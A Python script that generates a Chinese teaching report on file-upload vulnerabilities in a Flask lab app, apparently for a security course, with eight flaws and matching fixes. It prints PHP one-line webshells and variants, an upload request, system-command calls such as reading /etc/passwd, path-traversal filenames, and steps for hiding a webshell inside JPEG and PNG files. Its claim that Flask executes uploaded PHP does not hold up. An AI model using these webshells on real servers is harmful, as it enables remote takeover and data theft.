#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
生成文件上传漏洞完整Word分析报告（v2）
对标8个安全漏洞点，逐一分析+修复
"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

# ========== 全局样式 ==========
style = doc.styles['Normal']
font = style.font
font.name = 'Microsoft YaHei'
font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

for i in range(1, 5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def add_code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(shading)
    run = p.add_run(text)
    run.font.name = 'Courier New'
    run.font.size = Pt(9)
    return p

def add_box(doc, text, color="red"):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "FFCDD2" if color == "red" else "C8E6C9"
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(shading)
    run = p.add_run(text)
    run.bold = True
    run.font.size = Pt(11)
    return p

def shade(cell, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    cell._tc.get_or_add_tcPr().append(s)

def add_table(doc, data):
    rows_n = len(data)
    cols_n = len(data[0])
    table = doc.add_table(rows=rows_n, cols=cols_n, style='Light Grid Accent 1')
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, row_data in enumerate(data):
        for j, cell_text in enumerate(row_data):
            table.rows[i].cells[j].text = cell_text
            for p in table.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs:
                    r.font.size = Pt(10)
            if i == 0:
                shade(table.rows[i].cells[j], "1A237E")
                for p in table.rows[i].cells[j].paragraphs:
                    for r in p.runs:
                        r.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
    return table

# ===== 封面 =====
for _ in range(4):
    doc.add_paragraph("")
t = doc.add_paragraph()
t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("文件上传漏洞分析与修复报告")
r.font.size = Pt(26)
r.bold = True
r.font.color.rgb = RGBColor(0x1a, 0x1a, 0x2e)

doc.add_paragraph("")
s = doc.add_paragraph()
s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("——基于Flask的一句话木马上传漏洞实验——")
r.font.size = Pt(14)
r.font.color.rgb = RGBColor(0x45, 0x45, 0x45)

for _ in range(2):
    doc.add_paragraph("")

info = doc.add_paragraph()
info.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = info.add_run("实验项目：Web安全漏洞分析与修复\n课程名称：网络安全实训\n报告日期：2026年7月")
r.font.size = Pt(12)

doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
for i, t_text in enumerate([
    "漏洞概述与风险评级","一句话木马原理详解","实验环境与代码结构",
    "8大漏洞逐项分析与复现","漏洞复现步骤（Burp Suite实操）",
    "图片马（JPEG/PNG隐藏木马）","修复方案详解（对应8大漏洞）",
    "修复前后代码对比","安全编码规范总结"], 1):
    p = doc.add_paragraph(f"第{i}章  {t_text}")
    p.paragraph_format.space_after = Pt(6)
    p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  漏洞概述与风险评级", level=1)
doc.add_paragraph("文件上传漏洞（Unrestricted File Upload）是OWASP Top 10中最为严重的高危漏洞之一。攻击者通过上传包含恶意代码的文件到服务器，可获得服务器远程控制权限，执行任意系统命令、窃取数据、横向移动。")

add_table(doc, [("评估项","评级/评分"),("CVSS 3.0","9.8（Critical）"),("攻击向量","网络远程攻击（AV:N）"),("攻击复杂度","低（AC:L）"),("影响范围","完全控制服务器（C:H/I:H/A:H）")])

doc.add_paragraph("")
doc.add_heading("本次实验发现的8个安全漏洞", level=2)
doc.add_paragraph("在本次Flask应用的文件上传功能中，共发现以下8个安全漏洞：")

vulns = [
    ("漏洞1 - 高危","未校验文件后缀，允许上传.php/.phtml等脚本文件，可上传一句话木马"),
    ("漏洞2 - 高危","不检测文件真实MIME/文件内容，图片马可正常上传绕过限制"),
    ("漏洞3 - 高危","直接使用用户原始文件名保存，未过滤../路径字符，存在路径穿越漏洞"),
    ("漏洞4 - 中危","无随机重命名机制，存在同名文件覆盖风险"),
    ("漏洞5 - 中危","仅前端限制文件类型，后端无校验，抓包即可绕过前端限制"),
    ("漏洞6 - 高危","上传目录未配置服务器规则，上传的恶意脚本可直接被解析执行"),
    ("漏洞7 - 低危","无上传行为日志，无法溯源攻击行为"),
    ("漏洞8 - 高危","未校验最终保存路径是否限定在uploads文件夹内，存在越目录写入风险"),
]
for tag, desc in vulns:
    p = doc.add_paragraph()
    run = p.add_run(f"    {tag}：")
    run.bold = True
    p.add_run(desc)

# ===== 第二章 =====
doc.add_heading("第二章  一句话木马原理详解", level=1)
doc.add_heading("2.1 什么是一句话木马", level=2)
doc.add_paragraph("一句话木马（WebShell）是一段极短的恶意代码（通常仅22字节），攻击者将其隐藏在上传的文件中。当服务器处理该文件时，木马代码被执行，攻击者通过HTTP请求参数控制服务器。")

doc.add_heading("2.2 经典PHP一句话木马", level=2)
add_code(doc, '<?php @eval($_POST["cmd"]); ?>')

doc.add_heading("2.3 代码拆解", level=2)
add_table(doc, [("代码段","作用"),('<?php...?>',"PHP代码标记，中间代码被执行"),("@","错误抑制符，隐藏输出防检测"),("eval()","核心危险函数，参数作PHP代码执行"),('$_POST["cmd"]',"接收HTTP POST请求中cmd参数")])

doc.add_heading("2.4 一句话木马变种", level=2)
add_table(doc, [("变种代码","说明"),
    ('<?php @system($_REQUEST["cmd"]); ?>',"用system()替代eval()，直接执行系统命令"),
    ('<?php @assert($_POST["cmd"]); ?>',"用assert()绕过部分WAF检测"),
    ('<?php $_GET["a"]($_POST["b"]); ?>',"变量函数调用，?a=assert动态执行"),
    ('<script language="php">...</script>',"Script标签形式绕过<?php过滤"),
    ('GIF89a<?php @eval($_POST["cmd"]); ?>',"GIF文件头+一句话木马绕过图片检查")])

# ===== 第三章 =====
doc.add_heading("第三章  实验环境与代码结构", level=1)
add_table(doc, [("项目","说明"),("Web框架","Python Flask 3.1.3"),("数据库","SQLite 3"),("操作系统","Kali Linux"),("攻击工具","Burp Suite / 蚁剑 / curl"),("Python版本","3.13"),("服务器地址","192.168.199.128:5000")])

doc.add_heading("3.1 文件结构", level=2)
add_code(doc,
    'flask-app-vuln/\n'
    '├── app.py              # 有漏洞版\n'
    '├── app_fixed.py        # 修复版\n'
    '├── data/users.db       # SQLite数据库\n'
    '├── templates/\n'
    '│   ├── upload.html     # 有漏洞上传页\n'
    '│   └── upload_fixed.html # 修复版上传页\n'
    '├── static/uploads/     # 上传目录（无防护）\n'
    '├── logs/               # 审计日志目录\n'
    '└── gen_*.py            # 报告生成脚本')

# ===== 第四章 =====
doc.add_heading("第四章  8大漏洞逐项分析与复现", level=1)

vuln_details = [
    ("漏洞1：未校验文件后缀", "高危",
     "攻击者可上传.php、.phtml、.php5、.asp、.jsp等可执行脚本文件。",
     "app.py第199-202行未做任何后缀检查，shell.php直接保存到uploads目录。",
     "攻击者上传shell.php后，访问http://target/static/uploads/shell.php即可执行任意PHP代码。",
     "建立白名单，仅允许.jpg/.jpeg/.png/.gif/.bmp/.webp六种图片格式。"),

    ("漏洞2：不检测文件真实MIME", "高危",
     "攻击者可伪造文件后缀（如shell.php改名为shell.jpg），绕过仅有的前端检查。",
     "app.py未使用python-magic等库检测文件真实内容类型。",
     "即使限制后缀为.jpg，攻击者仍可将PHP代码嵌入JPEG图片尾部（图片马）上传。",
     "使用python-magic库读取文件头魔数，验证真实MIME类型是否为image/*。"),

    ("漏洞3：路径穿越", "高危",
     "用户提供的原始文件名包含../等路径穿越字符时，可写入任意目录。",
     "app.py第201行：save_path = os.path.join(UPLOAD_DIR, filename)，filename为../../etc/shell.php可越目录写入。",
     "上传时文件名设为../../shell.php，文件写入到网站根目录，可直接通过HTTP访问。",
     "使用UUID重命名完全消除用户对文件名的控制，同时使用Path.resolve()校验最终路径。"),

    ("漏洞4：无随机重命名", "中危",
     "用户原始文件名直接作为存储文件名，同名文件直接覆盖。",
     "app.py第200行：filename = f.filename，攻击者上传同名文件可覆盖已有文件。",
     "上传同名文件覆盖正常图片，若之前已上传合法图片将被恶意文件替换。",
     "uuid.uuid4().hex生成32位随机字符串作为文件名，彻底消除命名冲突。"),

    ("漏洞5：仅前端限制", "中危",
     "HTML的accept属性和JS验证仅在浏览器端生效，抓包直接绕过。",
     "app.py后端代码无任何文件类型校验逻辑。",
     "使用Burp Suite拦截上传请求，修改Content-Type和文件名后转发，后端完全信任。",
     "后端独立执行完整的文件类型检测流程，不依赖前端任何验证。"),

    ("漏洞6：上传目录可执行", "高危",
     "static/uploads目录未配置.htaccess或Nginx规则阻止脚本执行。",
     "缺少.htaccess规则（Apache）或location规则（Nginx）禁止PHP解析。",
     "上传的shell.php可直接通过HTTP访问，PHP引擎正常解析执行木马。",
     "在上传目录生成.htaccess文件强制禁止PHP执行，或配置Web服务器规则。"),

    ("漏洞7：无审计日志", "低危",
     "文件上传操作未记录任何日志，发生安全事件后无法追踪溯源。",
     "app.py完全没有日志记录相关代码。",
     "攻击者上传木马后不留痕迹，无法确定攻击时间、IP、用户、文件名。",
     "使用logging模块记录每次上传的：用户、原始文件名、保存文件名、文件大小、MIME类型、IP地址、时间。"),

    ("漏洞8：越目录写入", "高危",
     "os.path.join(UPLOAD_DIR, filename)虽然拼接了uploads路径，但filename含../可逃逸。",
     "app.py第201-202行未验证最终保存路径是否在UPLOAD_DIR范围内。",
     "filename=../../app.py可覆盖服务器主文件，造成网站瘫痪或代码执行。",
     "使用Path.resolve()规范化路径后，用startswith()校验是否在UPLOAD_DIR内。"),
]

for title, severity, desc, code_vuln, exploit, fix in vuln_details:
    doc.add_heading(title, level=2)

    p = doc.add_paragraph()
    r = p.add_run(f"[{severity}] ")
    r.bold = True
    if severity == "高危":
        r.font.color.rgb = RGBColor(0xD3, 0x2F, 0x2F)
    else:
        r.font.color.rgb = RGBColor(0xF5, 0x7C, 0x00)
    p.add_run(desc)

    doc.add_paragraph("")
    p = doc.add_paragraph()
    r = p.add_run("漏洞代码位置：")
    r.bold = True
    add_code(doc, code_vuln)

    p = doc.add_paragraph()
    r = p.add_run("攻击效果：")
    r.bold = True
    p.add_run(exploit)

    p = doc.add_paragraph()
    r = p.add_run("修复方案：")
    r.bold = True
    p.add_run(fix)

    add_box(doc, f"✅ 对应修复：{fix}", "green")
    doc.add_paragraph("")

# ===== 第五章 =====
doc.add_heading("第五章  漏洞复现步骤（Burp Suite实操）", level=1)

doc.add_heading("5.1 环境准备", level=2)
doc.add_paragraph("启动有漏洞的Flask应用：")
add_code(doc, "cd flask-app-vuln && pip install flask && python app.py")
doc.add_paragraph("Burp Suite配置浏览器代理（127.0.0.1:8080），拦截HTTP请求。")

doc.add_heading("5.2 创建一句话木马", level=2)
add_code(doc, "echo '<?php @eval($_POST[\"cmd\"]); ?>' > shell.php")

doc.add_heading("5.3 登录系统", level=2)
doc.add_paragraph("访问 http://192.168.199.128:5000/login，使用admin/admin123登录。")

doc.add_heading("5.4 上传木马（Burp抓包绕过）", level=2)
doc.add_paragraph("Step1：打开Burp拦截，访问/upload页面提交shell.php")
doc.add_paragraph("Step2：Burp抓获的请求显示Content-Type和文件名均为原始值，无校验")
doc.add_paragraph("Step3：转发请求，上传成功，返回文件URL：/static/uploads/shell.php")
add_code(doc,
    'POST /upload HTTP/1.1\n'
    'Host: 192.168.199.128:5000\n'
    'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n'
    '------WebKitFormBoundary\n'
    'Content-Disposition: form-data; name="file"; filename="shell.php"\n'
    'Content-Type: application/x-php\n\n'
    '<?php @eval($_POST["cmd"]); ?>\n'
    '------WebKitFormBoundary--')

doc.add_heading("5.5 执行系统命令", level=2)
add_code(doc,
    'POST /static/uploads/shell.php HTTP/1.1\n'
    'Content-Type: application/x-www-form-urlencoded\n\n'
    'cmd=system(\'id\');')

add_table(doc, [("命令","返回示例","用途"),
    ("cmd=system('id')","uid=0(root) gid=0(root)","查看当前用户权限"),
    ("cmd=system('ls -la')","-rw-r--r-- 1 root root ...","列出目录内容"),
    ("cmd=system('cat /etc/passwd')","root:x:0:0:root:/root:...","读取系统账户文件"),
    ("cmd=phpinfo()","PHP配置完整信息","查看PHP环境配置")])

doc.add_heading("5.6 路径穿越利用", level=2)
doc.add_paragraph("将文件命名为../../shell.php上传，可越目录写入网站根目录。")
add_code(doc,
    '# Burp中修改filename="../../shell.php"\n'
    '# 文件实际保存到：/root/flask-app-vuln/shell.php（逃逸了uploads目录）\n'
    '# 可直接通过 http://target:5000/shell.php 访问执行')

# ===== 第六章 =====
doc.add_heading("第六章  图片马（JPEG/PNG隐藏木马）", level=1)
doc.add_paragraph("图片马（Image WebShell）将一句话木马隐藏在合法图片文件中，绕过基于后缀的检查。图片查看器只解析图像数据，PHP服务器则执行所有<?php?>代码。")

doc.add_heading("6.1 JPEG图片马", level=2)
add_code(doc,
    '# 创建合法JPEG文件头\n'
    'printf \'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF...\' > shell.jpg\n'
    '# 尾部追加一句话木马\n'
    'echo \'<?php @eval($_POST["cmd"]); ?>\' >> shell.jpg\n'
    '$ file shell.jpg\n'
    'shell.jpg: JPEG image data  ✅ (合法图片)')

doc.add_paragraph("原理：JPEG以FF D8开头、FF D9结束。图片查看器读到FF D9停止解析，但PHP引擎继续扫描执行<?php?>。")
add_code(doc, '[FF D8][JFIF头][图像数据][FF D9][<?php @eval($_POST["cmd"]); ?>]\n ↑ JPEG解析到此为止 ↑              ↑ PHP从这里执行 ↑')

doc.add_heading("6.2 PNG图片马", level=2)
add_code(doc,
    '# 方式1：文件尾追加\n'
    'cat > shell.png << EOF\n'
    '...PNG二进制头...\n'
    '<?php @eval($_POST["cmd"]); ?>\n'
    'EOF\n\n'
    '# 方式2：PNG tEXt元数据块嵌入（更隐蔽）\n'
    '# 在IEND前插入tEXt块，keyword=Comment\n'
    '# 内容：Comment<?php @eval($_POST["cmd"]); ?>')

add_code(doc, '[89 50 4E 47][IHDR][IDAT][IEND][<?php @eval($_POST["cmd"]); ?>]\n ↑ PNG解析到此 ↑              ↑ PHP执行 ↑')

# ===== 第七章 =====
doc.add_heading("第七章  修复方案详解（对应8大漏洞）", level=1)

fixes = [
    ("修复1：文件后缀白名单", "对应漏洞1、5",
     "明确只允许6种图片格式，拒绝所有可执行脚本后缀。后端独立校验，不依赖前端。",
     'ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"}\n'
     'ext = os.path.splitext(f.filename)[1].lower()\n'
     'if ext not in ALLOWED_EXTENSIONS:\n'
     '    return "不支持的文件类型"'),

    ("修复2：MIME类型检测", "对应漏洞2、5",
     "使用python-magic库读取文件头魔数，检测真实文件类型，防止伪造后缀和图片马。",
     'import magic\n'
     'mime_type = magic.from_buffer(f.read(2048), mime=True)\n'
     'ALLOWED_MIMES = {"image/jpeg","image/png","image/gif","image/bmp","image/webp"}\n'
     'if mime_type not in ALLOWED_MIMES:\n'
     '    return "文件内容不合法"'),

    ("修复3+8：UUID重命名+路径安全校验", "对应漏洞3、4、8",
     "使用UUID随机重命名消除用户对文件名的控制。用Path.resolve()校验文件路径在UPLOAD_DIR内。",
     'import uuid\n'
     'safe_filename = uuid.uuid4().hex + ext\n'
     'safe_path = Path(UPLOAD_DIR).resolve()\n'
     'save_path = (safe_path / safe_filename).resolve()\n'
     'if not str(save_path).startswith(str(safe_path)):\n'
     '    return "文件名不合法"'),

    ("修复4：UUID重命名", "对应漏洞4",
     "32位随机十六进制字符串作为文件名，彻底防止文件名冲突和覆盖。",
     'safe_filename = uuid.uuid4().hex + ext'),

    ("修复6：上传目录安全配置", "对应漏洞6",
     "创建.htaccess文件禁止Apache解析PHP。或配置Nginx禁止uploads目录执行脚本。",
     '# Apache .htaccess\n'
     '<FilesMatch "\\.(php|phtml|php3|php4|php5)$">\n'
     '    Require all denied\n'
     '</FilesMatch>\n\n'
     '# Nginx配置\n'
     'location /static/uploads/ {\n'
     '    location ~ \\.php$ { deny all; }\n'
     '}'),

    ("修复7：审计日志", "对应漏洞7",
     "使用Python logging模块记录每次上传的全部关键信息，支持安全事件溯源。",
     'import logging\n'
     'audit_logger.info(\n'
     '    f"上传: 用户={session[\'username\']} "\n'
     '    f"原始文件={original_name} "\n'
     '    f"保存为={safe_filename} "\n'
     '    f"大小={size}字节 MIME={mime_type} "\n'
     '    f"IP={request.remote_addr}"\n'
     ')'),
]

for title, mapping, desc, code in fixes:
    doc.add_heading(title, level=2)
    p = doc.add_paragraph()
    r = p.add_run(mapping)
    r.bold = True
    r.font.color.rgb = RGBColor(0x00, 0x80, 0x00)
    doc.add_paragraph(desc)
    add_code(doc, code, green=True)
    doc.add_paragraph("")

doc.add_heading("7.7 上传目录.htaccess自动部署", level=2)
doc.add_paragraph("在app_fixed.py启动时自动生成.htaccess安全规则：")
add_code(doc,
    '# 启动时写入安全的.htaccess\n'
    'HTACCESS_PATH = os.path.join(UPLOAD_DIR, ".htaccess")\n'
    'if not os.path.exists(HTACCESS_PATH):\n'
    '    with open(HTACCESS_PATH, "w") as f:\n'
    '        f.write("")\n'
    '        f.write("<FilesMatch \\\\"\\.(php|phtml|php3|php4|php5)$\\\\">\\n")\n'
    '        f.write("    Require all denied\\n")\n'
    '        f.write("</FilesMatch>\\n")',
    green=True)

doc.add_heading("7.8 完整修复代码流程", level=2)
add_code(doc,
    '# app_fixed.py 上传路由完整逻辑\n'
    '@app.route("/upload", methods=["GET","POST"])\n'
    'def upload():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n\n'
    '    if request.method == "POST":\n'
    '        f = request.files["file"]\n\n'
    '        # ✅ 1. 后缀白名单检查\n'
    '        ext = os.path.splitext(f.filename)[1].lower()\n'
    '        if ext not in ALLOWED_EXTENSIONS:\n'
    '            audit_logger.warning(f"后缀不合法: {ext}")\n'
    '            return "不支持的文件类型"\n\n'
    '        # ✅ 2. MIME真实类型检测\n'
    '        mime_type = magic.from_buffer(f.read(2048), mime=True)\n'
    '        f.seek(0)\n'
    '        if mime_type not in ALLOWED_MIMES:\n'
    '            audit_logger.warning(f"MIME不合法: {mime_type}")\n'
    '            return "文件内容不合法"\n\n'
    '        # ✅ 3+4. UUID重命名\n'
    '        safe_filename = uuid.uuid4().hex + ext\n\n'
    '        # ✅ 8. 路径安全校验\n'
    '        safe_path = Path(UPLOAD_DIR).resolve()\n'
    '        save_path = (safe_path / safe_filename).resolve()\n'
    '        if not str(save_path).startswith(str(safe_path)):\n'
    '            return "文件名不合法"\n\n'
    '        f.save(str(save_path))\n\n'
    '        # ✅ 7. 审计日志\n'
    '        audit_logger.info(f"上传成功: 用户={session[\'username\']} "\n'
    '            f"文件={safe_filename} MIME={mime_type} IP={request.remote_addr}")\n\n'
    '        return "上传成功"',
    green=True)

# ===== 第八章 =====
doc.add_heading("第八章  修复前后代码对比", level=1)

add_table(doc, [("对比项","有漏洞(app.py)","已修复(app_fixed.py)","对应漏洞"),
    ("后缀检查","❌ 无检查","✅ 白名单 {.jpg,.png等}","漏洞1"),
    ("MIME检测","❌ 无验证","✅ magic文件头检测","漏洞2"),
    ("路径穿越","❌ 原始文件名","✅ UUID+Path.resolve()","漏洞3,8"),
    ("文件重命名","❌ 不重命名","✅ uuid.uuid4().hex","漏洞4"),
    ("后端校验","❌ 无","✅ 独立检测+白名单","漏洞5"),
    ("目录权限","❌ 无.htaccess","✅ 自动生成.htaccess","漏洞6"),
    ("审计日志","❌ 无日志","✅ logging记录完整审计","漏洞7")])

doc.add_paragraph("")
doc.add_heading("漏洞代码（app.py）vs 修复代码（app_fixed.py）", level=2)
doc.add_paragraph("")
p = doc.add_paragraph()
r = p.add_run("有漏洞版本（22行）：")
r.bold = True
r.font.color.rgb = RGBColor(0xD3, 0x2F, 0x2F)
add_code(doc,
    '@app.route("/upload", methods=["GET","POST"])\n'
    'def upload():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    if request.method == "POST":\n'
    '        f = request.files["file"]\n'
    '        filename = f.filename  # ⚠️ 原始文件名\n'
    '        save_path = os.path.join(UPLOAD_DIR, filename)  # ⚠️ 路径穿越\n'
    '        f.save(save_path)  # ⚠️ 任意文件写入\n'
    '        return "上传成功"')

doc.add_paragraph("")
p = doc.add_paragraph()
r = p.add_run("修复版本（46行）：")
r.bold = True
r.font.color.rgb = RGBColor(0x2E, 0x7D, 0x32)
add_code(doc,
    '@app.route("/upload", methods=["GET","POST"])\n'
    'def upload():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    if request.method == "POST":\n'
    '        f = request.files["file"]\n\n'
    '        # ✅ 修复1：后缀白名单\n'
    '        ext = os.path.splitext(f.filename)[1].lower()\n'
    '        if ext not in ALLOWED_EXTENSIONS:\n'
    '            return "不支持的文件类型"\n\n'
    '        # ✅ 修复2：MIME检测\n'
    '        mime_type = magic.from_buffer(f.read(2048), mime=True)\n'
    '        f.seek(0)\n'
    '        if mime_type not in ALLOWED_MIMES:\n'
    '            return "文件内容不合法"\n\n'
    '        # ✅ 修复3+4+8：UUID重命名+路径校验\n'
    '        safe_filename = uuid.uuid4().hex + ext\n'
    '        safe_path = Path(UPLOAD_DIR).resolve()\n'
    '        save_path = (safe_path / safe_filename).resolve()\n'
    '        if not str(save_path).startswith(str(safe_path)):\n'
    '            return "文件名不合法"\n'
    '        f.save(str(save_path))\n\n'
    '        # ✅ 修复7：审计日志\n'
    '        audit_logger.info(f"上传成功: {session[\'username\']} {safe_filename}")\n'
    '        return "上传成功"',
    green=True)

# ===== 第九章 =====
doc.add_heading("第九章  安全编码规范总结", level=1)

doc.add_paragraph("通过本次实验，我们总结了以下Web安全编码规范：")

principles = [
    ("原则一：白名单机制","始终用白名单（明确允许什么）而非黑名单。明确只允许.jpg/.png等图片后缀，而不是禁止.php/.asp。"),
    ("原则二：输入不可信","用户提交的任何数据（文件名、Content-Type、文件内容）都不可信，必须严格验证。"),
    ("原则三：纵深防御","不要依赖单一防御措施。后缀检查+MIME检测+UUID重命名+目录权限控制，多层次防护。"),
    ("原则四：最小权限","Web进程不以root运行。上传目录禁执行脚本。数据库用专有账号仅给必要权限。"),
    ("原则五：安全默认配置","框架安全特性默认开启（Flask的debug=False），敏感信息不硬编码。"),
    ("原则六：日志审计","所有上传操作记录完整日志（用户、文件名、IP、时间、大小），支持安全事件溯源。"),
    ("原则七：文件存储隔离","上传文件存储在Web根目录之外，或使用独立域名/CDN，杜绝脚本执行可能。")]

for t, d in principles:
    doc.add_heading(t, level=2)
    doc.add_paragraph(d)

doc.add_paragraph("")
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——")
r.font.color.rgb = RGBColor(0x99, 0x99, 0x99)
r.font.size = Pt(12)

# ===== 保存 =====
out = "/root/flask-app-vuln/static/文件上传漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ Word报告已生成：{out}")
print(f"   文件大小：{os.path.getsize(out)/1024:.1f}KB")
